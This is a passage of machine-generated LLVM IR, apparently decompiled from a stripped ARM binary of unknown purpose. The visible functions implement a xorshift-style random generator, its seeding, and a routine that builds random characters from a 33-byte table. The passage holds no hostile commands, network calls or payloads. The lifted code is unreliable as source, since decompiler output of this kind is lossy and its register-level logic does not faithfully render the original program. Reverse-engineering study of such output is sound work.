  %v3_ed58 = call i32 @function_15ca4(i32 1, i32 %v3_ed48, i32 %v3_ed4c)
  %v3_ed68 = call i32 @function_15ca4(i32 1, i32 ptrtoint (i32* @global_var_19844.152 to i32), i32 1)
  %v1_ed70 = call i32 @function_11a38(i32 2)
  %v0_ed74 = call i32 @function_14c98()
  %v1_ed78 = load i32, i32* @r6, align 4
  store i32 %v9_eb2c, i32* %r6.global-to-local, align 4
  ret i32 %v1_ed78

dec_label_pc_ed94:                                ; preds = %dec_label_pc_ebd0
  %v0_ed9c = load i32, i32* @r8, align 4
  %v1_eda8 = inttoptr i32 %v0_ed9c to i8*
  %v2_eda8 = call i32 @function_12370(i8* %v1_eda8)
  %v2_edb4 = call i32 @function_12bac(i32 2, i32 %v2_eda8)
  %v0_edc0 = load i32, i32* @r8, align 4
  %v2_edc4 = add i32 %v0_edc0, %v2_eda8
  %v3_edc4 = inttoptr i32 %v2_edc4 to i8*
  %v4_edc4 = load i8, i8* %v3_edc4, align 1
  %v6_edc4 = zext i8 %v4_edc4 to i32
  store i32 %v6_edc4, i32* @r4, align 4
  %v1_edd0 = inttoptr i32 %v0_edc0 to i8*
  %v2_edd0 = call i32 @function_12370(i8* %v1_edd0)
  %v2_eddc = call i32 @function_12bac(i32 4, i32 %v2_edd0)
  %v0_ede8 = load i32, i32* @r8, align 4
  %v2_edec = add i32 %v0_ede8, %v2_edd0
  %v3_edec = inttoptr i32 %v2_edec to i8*
  %v4_edec = load i8, i8* %v3_edec, align 1
  %v6_edec = zext i8 %v4_edec to i32
  store i32 %v6_edec, i32* @r7, align 4
  %v1_edf8 = inttoptr i32 %v0_ede8 to i8*
  %v2_edf8 = call i32 @function_12370(i8* %v1_edf8)
  %v2_ee04 = call i32 @function_12bac(i32 6, i32 %v2_edf8)
  %v0_ee10 = load i32, i32* @r8, align 4
  %v2_ee14 = add i32 %v0_ee10, %v2_edf8
  %v3_ee14 = inttoptr i32 %v2_ee14 to i8*
  %v4_ee14 = load i8, i8* %v3_ee14, align 1
  %v6_ee14 = zext i8 %v4_ee14 to i32
  store i32 %v6_ee14, i32* %r6.global-to-local, align 4
  %v1_ee20 = inttoptr i32 %v0_ee10 to i8*
  %v2_ee20 = call i32 @function_12370(i8* %v1_ee20)
  %v2_ee2c = call i32 @function_12bac(i32 8, i32 %v2_ee20)
  %v0_ee38 = load i32, i32* @r8, align 4
  %v2_ee3c = add i32 %v0_ee38, %v2_ee20
  %v3_ee3c = inttoptr i32 %v2_ee3c to i8*
  %v4_ee3c = load i8, i8* %v3_ee3c, align 1
  %v6_ee3c = zext i8 %v4_ee3c to i32
  store i32 %v6_ee3c, i32* @r5, align 4
  %v1_ee48 = inttoptr i32 %v0_ee38 to i8*
  %v2_ee48 = call i32 @function_12370(i8* %v1_ee48)
  %v2_ee54 = call i32 @function_12bac(i32 10, i32 %v2_ee48)
  %v0_ee58 = load i32, i32* @r4, align 4
  %v1_ee58 = urem i32 %v0_ee58, 256
  %v0_ee60 = load i32, i32* @r7, align 4
  %v1_ee60 = urem i32 %v0_ee60, 256
  %v1_ee64 = xor i32 %v1_ee60, 255
  store i32 %v1_ee64, i32* @r7, align 4
  %v0_ee68 = load i32, i32* %r6.global-to-local, align 4
  %v1_ee6c = sub nsw i32 174, %v1_ee58
  %v1_ee68 = urem i32 %v0_ee68, 256
  %v1_ee70 = xor i32 %v1_ee68, 255
  store i32 %v1_ee70, i32* @r6, align 4
  %v0_ee74 = load i32, i32* @r5, align 4
  %v1_ee74 = sub i32 -1, %v0_ee74
  %v2_ee78 = add nsw i32 %v1_ee64, %v1_ee6c
  %v0_ee7c = load i32, i32* @r8, align 4
  %v2_ee7c = add i32 %v0_ee7c, %v2_ee48
  %v3_ee7c = inttoptr i32 %v2_ee7c to i8*
  %v4_ee7c = load i8, i8* %v3_ee7c, align 1
  %v6_ee7c = zext i8 %v4_ee7c to i32
  %v2_ee84 = add nsw i32 %v1_ee70, %v2_ee78
  %v1_ee94 = sub nuw nsw i32 -1, %v6_ee7c
  %fold15 = add i32 %v2_ee84, %v1_ee74
  %v1_ee98 = urem i32 %fold15, 256
  %v2_eea0 = add nsw i32 %v1_ee98, %v1_ee94
  store i32 %v2_eea0, i32* @r4, align 4
  %v1_eeac = inttoptr i32 %v0_ee7c to i8*
  %v2_eeac = call i32 @function_12370(i8* %v1_eeac)
  %v2_eeb8 = call i32 @function_12bac(i32 12, i32 %v2_eeac)
  %v0_eebc = load i32, i32* @r8, align 4
  %v2_eebc = add i32 %v0_eebc, %v2_eeac
  %v3_eebc = inttoptr i32 %v2_eebc to i8*
  %v4_eebc = load i8, i8* %v3_eebc, align 1
  %v6_eebc = zext i8 %v4_eebc to i32
  %v0_eec0 = load i32, i32* @r4, align 4
  %v1_eec4 = sub nuw nsw i32 -1, %v6_eebc
  %fold = add i32 %v0_eec0, %v1_eec4
  %v1_eed0 = urem i32 %fold, 256
  %v3_eed8 = udiv i32 %v1_eed0, 9
  %v2_eee4 = sub i32 %fold, %v3_eed8
  %v2_eeec = ptrtoint i32* %stack_var_-40 to i32
  %v1_eee8 = mul i32 %v2_eee4, 4
  %v3_eef0 = and i32 %v1_eee8, 1020
  %v2_eef8 = add i32 %v3_eef0, %v2_eeec
  %v2_eefc = ptrtoint i8* %stack_var_-76 to i32
  store i32 %v2_eefc, i32* @r5, align 4
  %v1_ef00 = add i32 %v2_eef8, -172
  %v2_ef00 = inttoptr i32 %v1_ef00 to i32*
  %v3_ef00 = load i32, i32* %v2_ef00, align 4
  store i32 61196, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_ef00)
  %v0_ef10 = load i32, i32* @r8, align 4
  %v2_ef14 = inttoptr i32 %v0_ef10 to i8*
  %v3_ef14 = call i32 @function_1275c(i8* %v2_ef14, i32 %v2_eefc)
  store i32 %v3_ef14, i32* @r4, align 4
  %v2_ef24 = call i32 @function_12404(i32 %v2_ec08, i32 18)
  %v2_ef30 = call i32 @function_12404(i32 %v2_eefc, i32 12)
  %v0_ef34 = load i32, i32* @r4, align 4
  %v2_ef34 = icmp eq i32 %v0_ef34, 0
  br i1 %v2_ef34, label %dec_label_pc_ec88, label %dec_label_pc_ef3c

dec_label_pc_ef3c:                                ; preds = %dec_label_pc_ed94
  %v1_ef40 = call i32 @function_14e3c(i32 5)
  br label %dec_label_pc_ec88

dec_label_pc_ef48:                                ; preds = %dec_label_pc_eb2c
  %v3_ef50 = call i32 @function_1312c(i32 ptrtoint ([19 x i8]* @global_var_19830.155 to i32), i32 2)
  %v3_ef54 = icmp eq i32 %v3_ef50, -1
  store i32 %v3_ef50, i32* @r4, align 4
  br i1 %v3_ef54, label %dec_label_pc_ebd0, label %dec_label_pc_eba4

dec_label_pc_ef64:                                ; preds = %dec_label_pc_ec88
  %v0_ef64 = load i32, i32* @sl, align 4
  %v1_ef64 = add i32 %v0_ef64, 4
  %v2_ef64 = inttoptr i32 %v1_ef64 to i32*
  %v3_ef64 = load i32, i32* %v2_ef64, align 4
  %v1_ef68 = inttoptr i32 %v3_ef64 to i8*
  %v2_ef68 = call i32 @function_12370(i8* %v1_ef68)
  %v8_ef70 = icmp sgt i32 %v2_ef68, 31
  br i1 %v8_ef70, label %dec_label_pc_ecac, label %dec_label_pc_ef74

dec_label_pc_ef74:                                ; preds = %dec_label_pc_ef64
  %v0_ef74 = load i32, i32* @sl, align 4
  %v1_ef74 = add i32 %v0_ef74, 4
  %v2_ef74 = inttoptr i32 %v1_ef74 to i32*
  %v3_ef74 = load i32, i32* %v2_ef74, align 4
  store i32 %v2_ec8c, i32* @r0, align 4
  %v2_ef7c = bitcast i32* %stack_var_-174 to i8*
  %v3_ef7c = call i32 @function_12398(i8* %v2_ef7c, i32 %v3_ef74)
  %v0_ef80 = load i32, i32* @sl, align 4
  %v1_ef80 = add i32 %v0_ef80, 4
  %v2_ef80 = inttoptr i32 %v1_ef80 to i32*
  %v3_ef80 = load i32, i32* %v2_ef80, align 4
  %v1_ef88 = inttoptr i32 %v3_ef80 to i8*
  %v2_ef88 = call i32 @function_12370(i8* %v1_ef88)
  %v2_ef94 = call i32 @function_12404(i32 %v3_ef80, i32 %v2_ef88)
  br label %dec_label_pc_ecac

; uselistorder directives
  uselistorder i32 %v3_ef50, { 1, 2, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %v0_ee7c, { 1, 0 }
  uselistorder i32 %v0_ee38, { 1, 0 }
  uselistorder i32 %v0_ee10, { 1, 0 }
  uselistorder i32 %v0_ede8, { 1, 0 }
  uselistorder i32 %v0_edc0, { 1, 0 }
  uselistorder i32 %v2_ecd0, { 0, 2, 1 }
  uselistorder i32 %v2_ecbc, { 1, 0, 2 }
  uselistorder i32 %v0_ebb8, { 1, 0 }
  uselistorder i32 %v3_eb94, { 1, 2, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_12bac, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_15ca4, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_12398, { 0, 1, 14, 15, 16, 17, 18, 19, 20, 21, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 23, 24, 25, 28, 26, 29, 27, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67 }
  uselistorder i32 ()* @function_e928, { 1, 0 }
  uselistorder i32 ptrtoint (i16** @global_var_22968.123 to i32), { 1, 0 }
  uselistorder i32 47, { 4, 5, 0, 6, 1, 7, 2, 8, 9, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_197d0.21 to i32), { 0, 3, 1, 2, 4 }
  uselistorder i32 (i32, i32)* @function_14f04, { 1, 0 }
  uselistorder i32 (i32)* @function_15c8c, { 1, 0 }
  uselistorder label %dec_label_pc_ecac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ec88, { 2, 1, 0 }
}

define i32 @function_f570() local_unnamed_addr {
dec_label_pc_f570:
  %v2_f57c = load i32, i32* @global_var_223a4.168, align 4
  %v2_f580 = load i32, i32* @global_var_223b0.170, align 4
  %v4_f58c = mul i32 %v2_f57c, 2048
  %v5_f58c = xor i32 %v4_f58c, %v2_f57c
  store i32 %v5_f58c, i32* @r3, align 4
  %v4_f590 = udiv i32 %v2_f580, 524288
  %v5_f590 = xor i32 %v4_f590, %v2_f580
  %v2_f594 = load i32, i32* @global_var_223a8.172, align 4
  %v2_f598 = load i32, i32* @global_var_223ac.174, align 4
  store i32 %v2_f598, i32* @ip, align 4
  %v2_f59c = xor i32 %v5_f590, %v5_f58c
  %v4_f5a0 = udiv i32 %v5_f58c, 256
  %v5_f5a0 = xor i32 %v2_f59c, %v4_f5a0
  store i32 %v2_f594, i32* @global_var_223a4.168, align 4
  store i32 %v2_f598, i32* @global_var_223a8.172, align 4
  store i32 %v2_f580, i32* @global_var_223ac.174, align 4
  store i32 %v5_f5a0, i32* @global_var_223b0.170, align 4
  ret i32 %v5_f5a0

; uselistorder directives
  uselistorder i32 %v2_f580, { 2, 1, 0 }
  uselistorder i32 %v2_f57c, { 1, 0 }
}

define i32 @function_f5cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_f5cc:
  %v3_f5cc = load i32, i32* @r4, align 4
  %v6_f5cc = load i32, i32* @r5, align 4
  %v2_f5d8 = call i32 @function_15b1c(i32* null)
  store i32 %v2_f5d8, i32* @r0, align 4
  store i32 %v2_f5d8, i32* @global_var_223a4.168, align 4
  %v1_f5e4 = call i32 @function_15bc0(i32 %v2_f5d8)
  store i32 %v1_f5e4, i32* @r0, align 4
  store i32 %v1_f5e4, i32* @r4, align 4
  %v0_f5ec = call i32 @function_15bd4()
  store i32 ptrtoint (i32* @global_var_223a8.172 to i32), i32* @r5, align 4
  %v1_f5f4 = load i32, i32* @r4, align 4
  %v2_f5f4 = xor i32 %v1_f5f4, %v0_f5ec
  store i32 %v2_f5f4, i32* @global_var_223a8.172, align 4
  %v1_f5fc = call i32 @function_159a0(i32 %v2_f5f4)
  %v2_f600 = load i32, i32* @global_var_223a8.172, align 4
  %v2_f60c = xor i32 %v2_f600, %v1_f5fc
  store i32 %v2_f60c, i32* @global_var_223b0.170, align 4
  store i32 %v1_f5fc, i32* @global_var_223ac.174, align 4
  store i32 %v3_f5cc, i32* @r4, align 4
  store i32 %v6_f5cc, i32* @r5, align 4
  ret i32 %v1_f5fc

; uselistorder directives
  uselistorder i32 %v1_f5fc, { 1, 2, 0 }
  uselistorder i32 ()* @function_15bd4, { 1, 2, 0 }
  uselistorder i32 (i32)* @function_15bc0, { 0, 2, 1 }
}

define i32 @function_f634(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f634:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %v12_f634 = load i32, i32* @r7, align 4
  %v15_f634 = load i32, i32* @r8, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_19888.180 to i32), i32* %r1.global-to-local, align 4
  %v2_f648 = ptrtoint i32* %stack_var_-73 to i32
  store i32 %v2_f648, i32* %r0.global-to-local, align 4
  store i32 33, i32* %r2.global-to-local, align 4
  %v4_f650 = bitcast i32* %stack_var_-73 to i16*
  %v5_f650 = call i32 @function_1513c(i16* %v4_f650, i32 ptrtoint ([33 x i8]* @global_var_19888.180 to i32), i32 33)
  store i32 %v5_f650, i32* %r0.global-to-local, align 4
  %v0_f654 = load i32, i32* @r7, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f654 = icmp slt i32 %v0_f654, 0
  store i1 %v1_f654, i1* %cpsr_n.global-to-local, align 1
  %v2_f654 = icmp eq i32 %v0_f654, 0
  store i1 %v2_f654, i1* %cpsr_z.global-to-local, align 1
  %tmp24 = icmp slt i32 %v0_f654, 1
  br i1 %tmp24, label %dec_label_pc_f74c, label %dec_label_pc_f65c

dec_label_pc_f65c:                                ; preds = %dec_label_pc_f634
  store i32 ptrtoint (i32* @global_var_223b0.170 to i32), i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223ac.174 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223a8.172 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223a4.168 to i32), i32* %r3.global-to-local, align 4
  %v2_f66c = load i32, i32* @global_var_223b0.170, align 4
  store i32 %v2_f66c, i32* %r5.global-to-local, align 4
  %v2_f670 = load i32, i32* @global_var_223ac.174, align 4
  store i32 %v2_f670, i32* %sb.global-to-local, align 4
  %v2_f674 = load i32, i32* @global_var_223a8.172, align 4
  store i32 %v2_f674, i32* %sl.global-to-local, align 4
  %v2_f678 = load i32, i32* @global_var_223a4.168, align 4
  store i32 %v2_f678, i32* %r0.global-to-local, align 4
  %v2_f684 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_f6e8

dec_label_pc_f680:                                ; preds = %dec_label_pc_f6e8
  %v1_f680 = urem i32 %v5_f6f8, 256
  store i32 %v1_f680, i32* %r3.global-to-local, align 4
  store i32 %v2_f684, i32* %r1.global-to-local, align 4
  %v4_f688 = udiv i32 %v1_f680, 8
  %v5_f688 = add i32 %v4_f688, %v2_f684
  store i32 %v5_f688, i32* %r2.global-to-local, align 4
  %v1_f68c = add i32 %v5_f688, -33
  %v2_f68c = inttoptr i32 %v1_f68c to i8*
  %v3_f68c = load i8, i8* %v2_f68c, align 1
  %v4_f68c = zext i8 %v3_f68c to i32
  store i32 %v4_f68c, i32* %r0.global-to-local, align 4
  %v3_f690 = mul i32 %v5_f6f8, 65536
  store i32 %v3_f690, i32* %r1.global-to-local, align 4
  store i32 %v2_f684, i32* %r2.global-to-local, align 4
  %tmp25 = udiv i32 %v5_f6f8, 2048
  %v4_f698 = urem i32 %tmp25, 32
  %v5_f698 = add i32 %v4_f698, %v2_f684
  store i32 %v5_f698, i32* %r3.global-to-local, align 4
  %v1_f69c = add i32 %v5_f698, -33
  %v2_f69c = inttoptr i32 %v1_f69c to i8*
  %v3_f69c = load i8, i8* %v2_f69c, align 1
  %v4_f69c = zext i8 %v3_f69c to i32
  store i32 %v4_f69c, i32* %ip.global-to-local, align 4
  %v3_f6a0 = mul i32 %v5_f6f8, 256
  store i32 %v3_f6a0, i32* %r2.global-to-local, align 4
  %v3_f6a4 = inttoptr i32 %v0_f6fc to i8*
  store i8 %v3_f68c, i8* %v3_f6a4, align 1
  %v4_f6a4 = load i32, i32* %r6.global-to-local, align 4
  %v5_f6a4 = add i32 %v4_f6a4, 1
  store i32 %v5_f6a4, i32* %r6.global-to-local, align 4
  %v1_f6ac = load i32, i32* %r2.global-to-local, align 4
  %v4_f6ac = udiv i32 %v1_f6ac, 134217728
  %v5_f6ac = add i32 %v4_f6ac, %v2_f684
  store i32 %v5_f6ac, i32* %r1.global-to-local, align 4
  %v1_f6b0 = load i32, i32* %r4.global-to-local, align 4
  %v4_f6b0 = udiv i32 %v1_f6b0, 134217728
  %v5_f6b0 = add i32 %v4_f6b0, %v2_f684
  store i32 %v5_f6b0, i32* %r3.global-to-local, align 4
  %v1_f6b4 = add i32 %v5_f6ac, -33
  %v2_f6b4 = inttoptr i32 %v1_f6b4 to i8*
  %v3_f6b4 = load i8, i8* %v2_f6b4, align 1
  %v4_f6b4 = zext i8 %v3_f6b4 to i32
  store i32 %v4_f6b4, i32* %lr.global-to-local, align 4
  %v1_f6b8 = add i32 %v5_f6b0, -33
  %v2_f6b8 = inttoptr i32 %v1_f6b8 to i8*
  %v3_f6b8 = load i8, i8* %v2_f6b8, align 1
  %v4_f6b8 = zext i8 %v3_f6b8 to i32
  store i32 %v4_f6b8, i32* %r2.global-to-local, align 4
  %v0_f6bc = load i32, i32* @r7, align 4
  %v1_f6bc = add i32 %v0_f6bc, -4
  store i32 %v1_f6bc, i32* @r7, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f6c0 = icmp slt i32 %v1_f6bc, 0
  store i1 %v1_f6c0, i1* %cpsr_n.global-to-local, align 1
  %v2_f6c0 = icmp eq i32 %v1_f6bc, 0
  store i1 %v2_f6c0, i1* %cpsr_z.global-to-local, align 1
  %v0_f6c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_f6c4 = trunc i32 %v0_f6c4 to i8
  %v2_f6c4 = load i32, i32* @r8, align 4
  %v3_f6c4 = add i32 %v2_f6c4, 1
  %v4_f6c4 = inttoptr i32 %v3_f6c4 to i8*
  store i8 %v1_f6c4, i8* %v4_f6c4, align 1
  %v0_f6c8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_f6c8, i32* %r0.global-to-local, align 4
  %v0_f6cc = load i32, i32* @r8, align 4
  %v1_f6cc = add i32 %v0_f6cc, 4
  store i32 %v1_f6cc, i32* @r8, align 4
  %v0_f6d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_f6d0 = trunc i32 %v0_f6d0 to i8
  %v2_f6d0 = load i32, i32* %r6.global-to-local, align 4
  %v3_f6d0 = add i32 %v2_f6d0, 2
  %v4_f6d0 = inttoptr i32 %v3_f6d0 to i8*
  store i8 %v1_f6d0, i8* %v4_f6d0, align 1
  %v0_f6d4 = load i32, i32* %lr.global-to-local, align 4
  %v1_f6d4 = trunc i32 %v0_f6d4 to i8
  %v2_f6d4 = load i32, i32* %r6.global-to-local, align 4
  %v3_f6d4 = add i32 %v2_f6d4, 1
  %v4_f6d4 = inttoptr i32 %v3_f6d4 to i8*
  store i8 %v1_f6d4, i8* %v4_f6d4, align 1
  %v0_f6d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f6d8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_f6d8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_f6d8 = xor i1 %v1_f6d8, %v2_f6d8
  %v4_f6d8 = or i1 %v0_f6d8, %v3_f6d8
  br i1 %v4_f6d8, label %dec_label_pc_f730, label %dec_label_pc_f680.dec_label_pc_f6dc_crit_edge

dec_label_pc_f680.dec_label_pc_f6dc_crit_edge:    ; preds = %dec_label_pc_f680
  %v0_f6e8.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f6dc

dec_label_pc_f6dc:                                ; preds = %dec_label_pc_f680.dec_label_pc_f6dc_crit_edge, %dec_label_pc_f704
  %v0_f6e8.pre = phi i32 [ %v0_f6e8.pre.pre, %dec_label_pc_f680.dec_label_pc_f6dc_crit_edge ], [ %v0_f728, %dec_label_pc_f704 ]
  %v0_f6dc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f6dc, i32* %sl.global-to-local, align 4
  %v0_f6e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_f6e0, i32* %sb.global-to-local, align 4
  %v0_f6e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f6e4, i32* %r5.global-to-local, align 4
  %v0_f6f4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_f6e8

dec_label_pc_f6e8:                                ; preds = %dec_label_pc_f65c, %dec_label_pc_f6dc
  %v0_f718 = phi i32 [ %v0_f654, %dec_label_pc_f65c ], [ %v0_f6f4.pre, %dec_label_pc_f6dc ]
  %v0_f6ec = phi i32 [ %v2_f66c, %dec_label_pc_f65c ], [ %v0_f6e4, %dec_label_pc_f6dc ]
  %v0_f6e8 = phi i32 [ %v2_f678, %dec_label_pc_f65c ], [ %v0_f6e8.pre, %dec_label_pc_f6dc ]
  %v4_f6e8 = mul i32 %v0_f6e8, 2048
  %v5_f6e8 = xor i32 %v4_f6e8, %v0_f6e8
  store i32 %v5_f6e8, i32* %r3.global-to-local, align 4
  %v4_f6ec = udiv i32 %v0_f6ec, 524288
  %v5_f6ec = xor i32 %v4_f6ec, %v0_f6ec
  %v2_f6f0 = xor i32 %v5_f6ec, %v5_f6e8
  store i32 %v2_f6f0, i32* %r2.global-to-local, align 4
  %v1_f6f4 = add i32 %v0_f718, -3
  %v3_f6f4 = sub i32 2, %v0_f718
  %v4_f6f4 = and i32 %v3_f6f4, %v0_f718
  %v5_f6f4 = icmp slt i32 %v4_f6f4, 0
  store i1 %v5_f6f4, i1* %cpsr_v.global-to-local, align 1
  %v6_f6f4 = icmp slt i32 %v1_f6f4, 0
  store i1 %v6_f6f4, i1* %cpsr_n.global-to-local, align 1
  %v7_f6f4 = icmp eq i32 %v0_f718, 3
  store i1 %v7_f6f4, i1* %cpsr_z.global-to-local, align 1
  %v2_f6f8 = and i32 %v0_f6e8, 128
  %v3_f6f8 = icmp ne i32 %v2_f6f8, 0
  %v4_f6f8 = udiv i32 %v5_f6e8, 256
  %v5_f6f8 = xor i32 %v4_f6f8, %v2_f6f0
  store i32 %v5_f6f8, i32* %r4.global-to-local, align 4
  %v0_f6fc = load i32, i32* @r8, align 4
  store i32 %v0_f6fc, i32* %r6.global-to-local, align 4
  %v2_f700 = xor i1 %v7_f6f4, true
  %v3_f700 = and i1 %v3_f6f8, %v2_f700
  br i1 %v3_f700, label %dec_label_pc_f680, label %dec_label_pc_f704

dec_label_pc_f704:                                ; preds = %dec_label_pc_f6e8
  %v1_f718 = add i32 %v0_f718, -1
  store i32 %v1_f718, i32* @r7, align 4
  %v2_f714.neg = urem i32 %v5_f6f8, 33
  store i32 %v2_f714.neg, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f720 = icmp slt i32 %v1_f718, 0
  store i1 %v1_f720, i1* %cpsr_n.global-to-local, align 1
  %v2_f720 = icmp eq i32 %v1_f718, 0
  store i1 %v2_f720, i1* %cpsr_z.global-to-local, align 1
  %v1_f724 = trunc i32 %v2_f714.neg to i8
  %v3_f724 = inttoptr i32 %v0_f6fc to i8*
  store i8 %v1_f724, i8* %v3_f724, align 1
  %v4_f724 = load i32, i32* @r8, align 4
  %v5_f724 = add i32 %v4_f724, 1
  store i32 %v5_f724, i32* @r8, align 4
  %v0_f728 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_f728, i32* %r0.global-to-local, align 4
  %v0_f72c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f72c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_f72c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_f72c = xor i1 %v1_f72c, %v2_f72c
  %v4_f72c = or i1 %v0_f72c, %v3_f72c
  br i1 %v4_f72c, label %dec_label_pc_f730, label %dec_label_pc_f6dc

dec_label_pc_f730:                                ; preds = %dec_label_pc_f704, %dec_label_pc_f680
  store i32 ptrtoint (i32* @global_var_223ac.174 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223a8.172 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223a4.168 to i32), i32* %r1.global-to-local, align 4
  %v0_f73c = load i32, i32* %r4.global-to-local, align 4
  %v1_f73c = load i32, i32* %fp.global-to-local, align 4
  %v2_f73c = inttoptr i32 %v1_f73c to i32*
  store i32 %v0_f73c, i32* %v2_f73c, align 4
  %v0_f740 = load i32, i32* %r5.global-to-local, align 4
  %v1_f740 = load i32, i32* %r2.global-to-local, align 4
  %v2_f740 = inttoptr i32 %v1_f740 to i32*
  store i32 %v0_f740, i32* %v2_f740, align 4
  %v0_f744 = load i32, i32* %sb.global-to-local, align 4
  %v1_f744 = load i32, i32* %r3.global-to-local, align 4
  %v2_f744 = inttoptr i32 %v1_f744 to i32*
  store i32 %v0_f744, i32* %v2_f744, align 4
  %v0_f748 = load i32, i32* %sl.global-to-local, align 4
  %v1_f748 = load i32, i32* %r1.global-to-local, align 4
  %v2_f748 = inttoptr i32 %v1_f748 to i32*
  store i32 %v0_f748, i32* %v2_f748, align 4
  %v1_f754.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f74c

dec_label_pc_f74c:                                ; preds = %dec_label_pc_f634, %dec_label_pc_f730
  %v1_f754 = phi i32 [ %v5_f650, %dec_label_pc_f634 ], [ %v1_f754.pre, %dec_label_pc_f730 ]
  store i32 %v12_f634, i32* @r7, align 4
  store i32 %v15_f634, i32* @r8, align 4
  ret i32 %v1_f754

; uselistorder directives
  uselistorder i32 %v0_f728, { 1, 0 }
  uselistorder i32 %v2_f714.neg, { 1, 0 }
  uselistorder i32 %v0_f6fc, { 1, 2, 0 }
  uselistorder i32 %v5_f6f8, { 0, 5, 4, 2, 3, 1 }
  uselistorder i32 %v0_f6e8, { 2, 1, 0 }
  uselistorder i32 %v0_f6ec, { 1, 0 }
  uselistorder i32 %v0_f718, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v2_f684, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_f654, { 0, 1, 3, 2 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 5, 6, 8, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_f74c, { 1, 0 }
  uselistorder label %dec_label_pc_f6e8, { 1, 0 }
  uselistorder label %dec_label_pc_f6dc, { 1, 0 }
}

define i32 @function_f770(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f770:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_f770 = load i32, i32* %r1.global-to-local, align 4
  %v3_f774 = load i32, i32* @r4, align 4
